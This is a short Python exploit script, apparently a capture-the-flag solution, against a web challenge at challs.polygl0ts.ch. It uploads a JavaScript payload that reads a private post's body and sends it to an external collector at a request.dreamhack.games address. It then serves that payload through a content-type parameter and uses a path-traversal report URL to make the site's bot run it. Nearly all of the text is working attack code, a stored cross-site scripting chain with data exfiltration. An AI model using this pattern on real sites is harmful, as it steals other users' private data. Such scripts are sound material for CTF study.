import requests


sess = requests.Session()
sess.get('https://challs.polygl0ts.ch:8333/')


def add_post(body):
    req = sess.post('https://challs.polygl0ts.ch:8333/', data={'title': 'x', 'body': body})
    # get redirected url
    print(req.url)
    return req.url.split('/')[-1]

script = add_post('''
async function main() {
  const res = await fetch('/api/posts/1/body');
  const post = await res.text();
  location = 'https://ucqmbft.request.dreamhack.games/leak?body=' + post;
}
main();
''')
html = add_post(f'<script src="/api/posts/{script}/body?contentType=text/javascript"></script>')

r = sess.post(f'https://challs.polygl0ts.ch:8333/posts/1%2F..%2F..%2Fapi%2Fposts%2F{html}%2Fbody/report')
print(r.text)
